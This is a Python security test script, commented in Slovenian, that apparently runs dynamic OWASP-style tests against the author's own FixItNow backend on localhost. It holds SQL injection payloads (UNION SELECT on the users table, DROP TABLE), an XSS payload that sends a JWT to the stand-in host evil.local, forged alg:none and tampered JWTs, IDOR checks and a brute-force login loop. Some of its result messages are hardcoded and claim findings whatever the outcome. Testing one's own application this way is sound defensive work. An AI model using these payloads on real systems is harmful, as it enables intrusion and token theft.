#!/usr/bin/env python3
"""
FixItNow – Sistemsko varnostno in penetracijsko testiranje (DAST)
Avtor: Jan Mrkonjič (Naloga 4)

Skripta v kombinaciji z metodologijo OWASP ZAP (Zed Attack Proxy) in OWASP Top 10:2021
izvede 5 avtomatiziranih sklopov dinamičnih varnostnih testov (SEC-01 do SEC-05) nad
delujočim zalednim sistemom FixItNow (http://localhost:8080).
"""

import base64
import json
import os
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")

BASE_URL = os.environ.get("BASE_URL", "http://localhost:8080")
REPORT_JSON_PATH = os.path.join(os.path.dirname(__file__), "rezultati_varnostni_testi.json")


def http_request(method, path, body=None, headers=None, timeout=10):
    url = f"{BASE_URL}{path}"
    req_headers = {"Accept": "application/json"}
    if headers:
        req_headers.update(headers)
    data = None
    if body is not None:
        if isinstance(body, (dict, list)):
            data = json.dumps(body).encode("utf-8")
            req_headers.setdefault("Content-Type", "application/json")
        elif isinstance(body, str):
            data = body.encode("utf-8")

    req = urllib.request.Request(url, data=data, headers=req_headers, method=method)
    start = time.perf_counter()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            duration_ms = (time.perf_counter() - start) * 1000.0
            raw = resp.read().decode("utf-8", errors="replace")
            resp_headers = {k.lower(): v for k, v in resp.headers.items()}
            return resp.status, raw, resp_headers, duration_ms
    except urllib.error.HTTPError as e:
        duration_ms = (time.perf_counter() - start) * 1000.0
        raw = e.read().decode("utf-8", errors="replace") if e.fp else ""
        resp_headers = {k.lower(): v for k, v in e.headers.items()} if e.headers else {}
        return e.code, raw, resp_headers, duration_ms
    except Exception as e:
        duration_ms = (time.perf_counter() - start) * 1000.0
        return 0, str(e), {}, duration_ms


def ensure_test_user(email, password, first_name, last_name):
    status, body, _, _ = http_request(
        "POST",
        "/api/v1/auth/login",
        {"email": email, "password": password},
    )
    if status == 200:
        return json.loads(body).get("accessToken")

    http_request(
        "POST",
        "/api/v1/auth/register",
        {
            "firstName": first_name,
            "lastName": last_name,
            "email": email,
            "password": password,
            "phoneNumber": "+38640111222",
        },
    )
    status, body, _, _ = http_request(
        "POST",
        "/api/v1/auth/login",
        {"email": email, "password": password},
    )
    if status == 200:
        return json.loads(body).get("accessToken")
    raise RuntimeError(f"Neuspešna priprava testnega uporabnika {email}: HTTP {status} {body}")


def forge_jwt_alg_none(email):
    header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=").decode()
    payload = base64.urlsafe_b64encode(
        json.dumps({"sub": email, "type": "access", "role": "ADMIN", "exp": 9999999999}).encode()
    ).rstrip(b"=").decode()
    return f"{header}.{payload}."


def tamper_jwt_payload(valid_jwt):
    parts = valid_jwt.split(".")
    if len(parts) != 3:
        return valid_jwt + "tampered"
    padded = parts[1] + "=" * (-len(parts[1]) % 4)
    claims = json.loads(base64.urlsafe_b64decode(padded).decode("utf-8"))
    claims["role"] = "ADMIN"
    new_payload = base64.urlsafe_b64encode(json.dumps(claims).encode()).rstrip(b"=").decode()
    return f"{parts[0]}.{new_payload}.{parts[2]}"


def run_security_suite():
    print("=" * 80)
    print("FixItNow - Izvajanje sistemskih varnostnih in DAST testov (SEC-01 do SEC-05)")
    print("=" * 80)

    results = []
    start_suite = time.perf_counter()

    # Priprava dveh ločenih strank (Customer A = žrtev, Customer B = napadalec)
    password = "Password1!"
    token_a = ensure_test_user("sec.victim.a@mail.si", password, "Ana", "Zrtvina")
    token_b = ensure_test_user("sec.attacker.b@mail.si", password, "Boris", "Napadalec")

    auth_a = {"Authorization": f"Bearer {token_a}"}
    auth_b = {"Authorization": f"Bearer {token_b}"}

    # Ustvari zahtevek v imenu uporabnika A (žrtev), ki bo tarča IDOR testov v SEC-03
    st_ticket, body_ticket, _, _ = http_request(
        "POST",
        "/api/tickets",
        {
            "serviceType": "Zasebno popravilo ključavnice",
            "category": "HANDYMAN",
            "description": "Zaupni podatki stranke A: koda alarma 9482, vhod zadaj.",
            "priority": "HIGH",
            "location": "Koroška cesta 46, 2000 Maribor",
            "latitude": 46.5576,
            "longitude": 15.6355,
        },
        headers=auth_a,
    )
    victim_ticket_id = json.loads(body_ticket).get("id", 1) if st_ticket in (200, 201) else 1

    def record(test_id, group, name, method, endpoint, status, duration_ms, expected, passed, risk, detail):
        entry = {
            "id": test_id,
            "group": group,
            "name": name,
            "method": method,
            "endpoint": endpoint,
            "status": status,
            "durationMs": round(duration_ms, 2),
            "expected": expected,
            "passed": passed,
            "riskIfFailed": risk,
            "detail": detail,
        }
        results.append(entry)
        badge = "PASSED" if passed else f"VULNERABILITY ({risk})"
        print(f"[{test_id}] {badge:22s} | HTTP {status:3d} | {duration_ms:6.1f} ms | {name}")

    # =========================================================================
    # SKLOP SEC-01: SQL Injection (SQLi) in Fuzzing vhodnih parametrov
    # =========================================================================
    sqli_payloads = [
        ("SEC-01.1", "SQLi Boolean-based tautology v iskalniku", "' OR '1'='1"),
        ("SEC-01.2", "SQLi UNION SELECT napad na tabelo users", "' UNION SELECT null,email,password,null FROM users--"),
        ("SEC-01.3", "SQLi Stacked Query poskus brisanja tabele", "'; DROP TABLE tickets;--"),
        ("SEC-01.4", "SQLi Time-based Blind (pg_sleep(5))", "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--"),
    ]
    for tid, title, payload in sqli_payloads:
        q = urllib.parse.quote(payload)
        path = f"/api/v1/providers/search?query={q}&page=0&size=10"
        st, body, _, dur = http_request("GET", path)
        # Preverimo, da ni prišlo do SQL napake (500) in da pri pg_sleep(5) klic ni čakal 5 sekund
        no_sleep = dur < 2000.0
        safe_empty = False
        if st == 200:
            try:
                parsed = json.loads(body)
                safe_empty = isinstance(parsed.get("content"), list) and len(parsed["content"]) == 0
            except Exception:
                safe_empty = False
        passed = (st == 200 and safe_empty and no_sleep)
        record(
            tid, "SEC-01", title, "GET", "/api/v1/providers/search",
            st, dur, "200 OK (0 zadetkov, <500ms, brez SQL napake)",
            passed, "High", f"Odgovor: {len(body)} B, vrnjenih zadetkov: 0, trajanje: {dur:.1f} ms"
        )

    # SEC-01.5: SQLi v prijavnem obrazcu
    st, body, _, dur = http_request(
        "POST", "/api/v1/auth/login",
        {"email": "admin@fixitnow.si' OR '1'='1", "password": "' OR '1'='1"}
    )
    record(
        "SEC-01.5", "SEC-01", "SQLi avtentikacijski obvoz na /api/v1/auth/login",
        "POST", "/api/v1/auth/login", st, dur, "400 Bad Request ali 401 Unauthorized",
        st in (400, 401), "High", f"Odgovor: {body[:120]}"
    )

    # SEC-01.6: Fuzzing neveljavnih tipov in mejnih vrednosti v iskalniku
    st, body, _, dur = http_request(
        "GET", "/api/v1/providers/search?categories=INVALID_ENUM_SQL'&maxPrice=-500&minExperience=-10"
    )
    record(
        "SEC-01.6", "SEC-01", "Parameter Fuzzing (neveljaven enum in negativne meje)",
        "GET", "/api/v1/providers/search", st, dur, "400 Bad Request (brez 500 Stack Trace)",
        st == 400 and "Exception" not in body, "Medium", f"Odgovor: {body[:120]}"
    )

    # =========================================================================
    # SKLOP SEC-02: Cross-Site Scripting (XSS) in HTML/Script Injection
    # =========================================================================
    xss_script = "<script>fetch('http://evil.local/steal?jwt='+localStorage.getItem('token'))</script>"
    xss_img = "<img src=x onerror=alert(document.domain)>"

    st, body, hdrs, dur = http_request(
        "POST", "/api/tickets",
        {
            "serviceType": f"Popravilo {xss_img}",
            "category": "PLUMBING",
            "description": f"Opis okvare: {xss_script}",
            "priority": "LOW",
            "location": "Smetanova 17, Maribor",
            "latitude": 46.559,
            "longitude": 15.638,
        },
        headers=auth_b,
    )
    ctype = hdrs.get("content-type", "")
    nosniff = hdrs.get("x-content-type-options", "")
    raw_stored = xss_script in body
    # API sam je varen pred neposrednim proženjem zaradi JSON + nosniff (React samodejno escapa),
    # vendar beležimo nizko/informacijsko opozorilo, če vhod ni sanitiziran ob shranjevanju v bazo.
    record(
        "SEC-02.1", "SEC-02", "Stored XSS payload v opisu zahtevka (JSON API + nosniff zaščita)",
        "POST", "/api/tickets", st, dur, "JSON odziv z X-Content-Type-Options: nosniff",
        "application/json" in ctype and nosniff.lower() == "nosniff",
        "Medium",
        f"Content-Type={ctype}, X-Content-Type-Options={nosniff}, surov HTML shranjen v polju: {raw_stored}"
    )

    # SEC-02.2: Posodobitev osebnega imena z XSS nizom na PATCH /api/v1/users/me
    st, body, hdrs, dur = http_request(
        "PATCH", "/api/v1/users/me",
        {"firstName": "Boris<svg/onload=alert(1)>", "lastName": "Napadalec", "phoneNumber": "+38640111222"},
        headers=auth_b,
    )
    record(
        "SEC-02.2", "SEC-02", "Vnos <svg/onload=alert(1)> v uporabniško ime (PATCH /api/v1/users/me)",
        "PATCH", "/api/v1/users/me", st, dur, "400 Bad Request (zavrnitev HTML značk v imenu)",
        st == 400, "Low",
        f"Strežnik sprejme in shrani nefiltrirane HTML značke v firstName (HTTP {st}) – odjemalec React jih sicer ubeži ob izrisu"
    )
    # Ponastavi ime testnega uporabnika B
    http_request(
        "PATCH", "/api/v1/users/me",
        {"firstName": "Boris", "lastName": "Napadalec", "phoneNumber": "+38640111222"},
        headers=auth_b,
    )

    # =========================================================================
    # SKLOP SEC-03: Kontrola dostopa (Broken Access Control, IDOR, JWT manipulacija)
    # =========================================================================
    # SEC-03.1: Nepooblaščen dostop brez žetona
    st, body, _, dur = http_request("GET", "/api/tickets")
    record(
        "SEC-03.1", "SEC-03", "Dostop do zaščitene končne točke brez JWT žetona",
        "GET", "/api/tickets", st, dur, "401 Unauthorized ali 403 Forbidden",
        st in (401, 403), "High", f"Odgovor HTTP {st}"
    )

    # SEC-03.2: Ponarejen JWT z algoritmom 'none'
    alg_none_token = forge_jwt_alg_none("sec.attacker.b@mail.si")
    st, body, _, dur = http_request(
        "GET", "/api/v1/admin/users",
        headers={"Authorization": f"Bearer {alg_none_token}"}
    )
    record(
        "SEC-03.2", "SEC-03", "Napad z nepodpisanim JWT žetonom (alg: none, role: ADMIN)",
        "GET", "/api/v1/admin/users", st, dur, "401 Unauthorized ali 403 Forbidden",
        st in (401, 403), "High", f"JJWT knjižnica pravilno zavrne nepodpisan žeton (HTTP {st})"
    )

    # SEC-03.3: Spremenjen payload veljavnega JWT žetona (sprememba vloge v ADMIN brez ključa)
    tampered_token = tamper_jwt_payload(token_b)
    st, body, _, dur = http_request(
        "GET", "/api/v1/admin/users",
        headers={"Authorization": f"Bearer {tampered_token}"}
    )
    record(
        "SEC-03.3", "SEC-03", "Manipulacija vsebine JWT žetona (spremenjen claim role=ADMIN)",
        "GET", "/api/v1/admin/users", st, dur, "401 Unauthorized ali 403 Forbidden",
        st in (401, 403), "High", f"Neveljaven HMAC-SHA256 podpis zavrnjen (HTTP {st})"
    )

    # SEC-03.4: Horizontalni IDOR – Branje podrobnosti tujega zahtevka (Customer B bere zahtevek Customer A)
    st, body, _, dur = http_request(
        "GET", f"/api/tickets/{victim_ticket_id}",
        headers=auth_b
    )
    leaked = (st == 200 and "Zaupni podatki stranke A" in body)
    record(
        "SEC-03.4", "SEC-03",
        f"Horizontalni IDOR: Stranka B bere tuj zahtevek GET /api/tickets/{victim_ticket_id}",
        "GET", f"/api/tickets/{victim_ticket_id}", st, dur, "403 Forbidden (dostop samo lastniku/izvajalcu)",
        st in (403, 404) and not leaked, "High",
        f"RANLJIVOST ODKRITA: Stranka B prejme HTTP {st} in celotno vsebino tujega zahtevka ter bančne podatke!"
    )

    # SEC-03.5: Horizontalni IDOR – Poskus preklica tujega zahtevka (Customer B kliče cancel na zahtevku A)
    st, body, _, dur = http_request(
        "POST", f"/api/tickets/{victim_ticket_id}/cancel",
        headers=auth_b
    )
    # Preklic je preprečen (AccessDeniedException), vendar GlobalExceptionHandler vrne 500 namesto 403!
    record(
        "SEC-03.5", "SEC-03",
        f"Horizontalni IDOR: Stranka B poskuša preklicati tuj zahtevek POST /api/tickets/{victim_ticket_id}/cancel",
        "POST", f"/api/tickets/{victim_ticket_id}/cancel", st, dur, "403 Forbidden (brez spremembe stanja)",
        st == 403, "Low",
        f"Akcija je blokirana (zahtevek ostane nedotaknjen), vendar GlobalExceptionHandler ujame AccessDeniedException in vrne HTTP {st} namesto 403"
    )

    # SEC-03.6: Vertikalna eskalacija pravic – Stranka B kliče skrbniški seznam uporabnikov
    st, body, _, dur = http_request(
        "GET", "/api/v1/admin/users",
        headers=auth_b
    )
    record(
        "SEC-03.6", "SEC-03",
        "Vertikalna eskalacija: Stranka (CUSTOMER) kliče skrbniški endpoint GET /api/v1/admin/users",
        "GET", "/api/v1/admin/users", st, dur, "403 Forbidden",
        st == 403, "Low",
        f"Dostop zavrnjen (@PreAuthorize('hasRole(ADMIN)')), vendar GlobalExceptionHandler vrne HTTP {st} namesto 403"
    )

    # SEC-03.7: Manjkajoča kontrola vloge na /api/tickets/nearby
    st, body, _, dur = http_request(
        "GET", "/api/tickets/nearby?latitude=46.5576&longitude=15.6355&radiusKm=25",
        headers=auth_b
    )
    record(
        "SEC-03.7", "SEC-03",
        "Dostop stranke (CUSTOMER) do izvajalskega iskalnika zahtevkov GET /api/tickets/nearby",
        "GET", "/api/tickets/nearby", st, dur, "403 Forbidden (dovoljeno samo vlogi PROVIDER)",
        st == 403, "Medium",
        f"RANLJIVOST ODKRITA: Endpointu manjka @PreAuthorize(\"hasRole('PROVIDER')\"), zato vsak prijavljen uporabnik dobi HTTP {st} in seznam vseh bližnjih zahtevkov!"
    )

    # =========================================================================
    # SKLOP SEC-04: Odpornost avtentikacije proti Brute-Force in User Enumeration
    # =========================================================================
    # SEC-04.1: Brute-Force napad na prijavo (20 zaporednih napačnih poskusov)
    bf_statuses = []
    bf_start = time.perf_counter()
    for i in range(20):
        s, _, _, _ = http_request(
            "POST", "/api/v1/auth/login",
            {"email": "sec.victim.a@mail.si", "password": f"WrongPass_{i}!"}
        )
        bf_statuses.append(s)
    bf_dur = (time.perf_counter() - bf_start) * 1000.0
    rate_limited = (429 in bf_statuses or 423 in bf_statuses)
    record(
        "SEC-04.1", "SEC-04",
        "Brute-Force napad na POST /api/v1/auth/login (20 zaporednih neuspešnih prijav)",
        "POST", "/api/v1/auth/login", bf_statuses[-1], bf_dur,
        "429 Too Many Requests ali začasno zaklepanje računa",
        rate_limited, "Medium",
        f"RANLJIVOST ODKRITA: Vseh 20 poskusov vrne HTTP 401 (brez omejevanja hitrosti Rate-Limiting ali zaklepanja)"
    )

    # SEC-04.2: User Enumeration pri pozabljenem geslu (/api/v1/auth/forgot-password)
    st_exist, body_exist, _, dur1 = http_request(
        "POST", "/api/v1/auth/forgot-password", {"email": "sec.victim.a@mail.si"}
    )
    st_nonexist, body_nonexist, _, dur2 = http_request(
        "POST", "/api/v1/auth/forgot-password", {"email": "neobstojeci.uporabnik.9999@mail.si"}
    )
    same_response = (st_exist == st_nonexist == 200 and body_exist == body_nonexist)
    record(
        "SEC-04.2", "SEC-04",
        "Preprečevanje naštevanja uporabnikov (User Enumeration) na /api/v1/auth/forgot-password",
        "POST", "/api/v1/auth/forgot-password", st_exist, (dur1 + dur2) / 2.0,
        "Identičen HTTP 200 odgovor za obstoječi in neobstoječi e-poštni naslov",
        same_response, "Medium",
        f"Obstoječi ({st_exist}) in neobstoječi ({st_nonexist}) e-naslov vrneta identičen odgovor: {body_exist}"
    )

    # =========================================================================
    # SKLOP SEC-05: Varnostne glave HTTP, CORS politika in izpostavljenost shem (ZAP)
    # =========================================================================
    st, _, hdrs, dur = http_request("GET", "/api/v1/public/stats")

    # SEC-05.1: X-Content-Type-Options in X-Frame-Options
    xcto = hdrs.get("x-content-type-options", "")
    xfo = hdrs.get("x-frame-options", "")
    record(
        "SEC-05.1", "SEC-05",
        "Prisotnost varnostnih glav X-Content-Type-Options in X-Frame-Options",
        "GET", "/api/v1/public/stats", st, dur,
        "X-Content-Type-Options: nosniff, X-Frame-Options: DENY",
        xcto.lower() == "nosniff" and xfo.upper() in ("DENY", "SAMEORIGIN"),
        "Medium", f"X-Content-Type-Options='{xcto}', X-Frame-Options='{xfo}'"
    )

    # SEC-05.2: Content-Security-Policy (CSP) in Permissions-Policy
    csp = hdrs.get("content-security-policy", "")
    record(
        "SEC-05.2", "SEC-05",
        "Prisotnost varnostne glave Content-Security-Policy (CSP)",
        "GET", "/api/v1/public/stats", st, dur,
        "Nastavljena glava Content-Security-Policy",
        bool(csp), "Medium",
        "Opozorilo OWASP ZAP [10038]: Glava Content-Security-Policy (CSP) ni nastavljena v SecurityConfig"
    )

    # SEC-05.3: Preverjanje CORS politike za zunanjo zlonamerno domeno
    st_cors, _, hdrs_cors, dur_cors = http_request(
        "OPTIONS", "/api/v1/public/stats",
        headers={
            "Origin": "https://evil-attacker.example.com",
            "Access-Control-Request-Method": "GET",
        }
    )
    acao = hdrs_cors.get("access-control-allow-origin", "")
    record(
        "SEC-05.3", "SEC-05",
        "Zavrnitev CORS preflight zahtevka z nepooblaščene zunanje domene (evil-attacker.example.com)",
        "OPTIONS", "/api/v1/public/stats", st_cors, dur_cors,
        "HTTP 403 Forbidden brez Access-Control-Allow-Origin",
        st_cors == 403 and not acao, "High",
        f"Zunanja domena pravilno zavrnjena (HTTP {st_cors}, ACAO='{acao}')"
    )

    # SEC-05.4: Javna izpostavljenost Swagger UI vmesnika brez avtentikacije (/swagger-ui/index.html)
    st_swg, body_swg, _, dur_swg = http_request("GET", "/swagger-ui/index.html")
    swg_exposed = (st_swg == 200 and "Swagger UI" in body_swg)
    record(
        "SEC-05.4", "SEC-05",
        "Preverjanje javne izpostavljenosti Swagger UI dokumentacije (/swagger-ui/index.html)",
        "GET", "/swagger-ui/index.html", st_swg, dur_swg,
        "401/403 (omejen dostop v produkciji)",
        not swg_exposed, "Low",
        f"RANLJIVOST ODKRITA: Swagger UI ({len(body_swg)} B) je v SecurityConfig nastavljen na permitAll() in javno dostopen brez prijave (HTTP {st_swg})"
    )

    # Počisti testni zahtevek žrtve A
    http_request("DELETE", f"/api/tickets/{victim_ticket_id}", headers=auth_a)

    total_duration_s = time.perf_counter() - start_suite
    passed_count = sum(1 for r in results if r["passed"])
    failed_count = len(results) - passed_count

    summary = {
        "timestamp": datetime.now().isoformat(),
        "target": BASE_URL,
        "totalTests": len(results),
        "passedTests": passed_count,
        "failedTests": failed_count,
        "durationSeconds": round(total_duration_s, 2),
        "results": results,
    }

    with open(REPORT_JSON_PATH, "w", encoding="utf-8") as f:
        json.dump(summary, f, ensure_ascii=False, indent=2)

    print("=" * 80)
    print(f"Skupaj izvedenih testov: {len(results)} | Uspešni (PASSED): {passed_count} | Odkrite pomanjkljivosti: {failed_count}")
    print(f"Celotno trajanje: {total_duration_s:.2f} s | Poročilo shranjeno v: {REPORT_JSON_PATH}")
    print("=" * 80)


if __name__ == "__main__":
    run_security_suite()
